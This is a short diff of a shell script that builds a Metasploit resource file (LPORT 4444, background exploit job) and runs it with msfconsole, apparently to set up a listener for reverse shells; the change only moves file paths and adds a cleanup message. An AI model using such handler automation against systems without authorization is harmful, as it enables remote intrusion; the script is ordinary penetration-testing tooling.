@@ -19,6 +19,7 @@ echo set LPORT 4444 >>$m
 echo set ExitOnSession false >> $m
 echo exploit -j -z  >> $m
 
-sudo chmod +755  /home/ivan/ivdim/$m 
-msfconsole -r /home/ivan/ivdim/$m
-sudo rm -rf  /home/ivan/ivdim/$m  
+sudo chmod +755  ~/Desktop/ivdim/$m 
+msfconsole -r ~/Desktop/ivdim/$m
+echo "Cleaning up"
+sudo rm -rf  ~/Desktop/ivdim/$m  
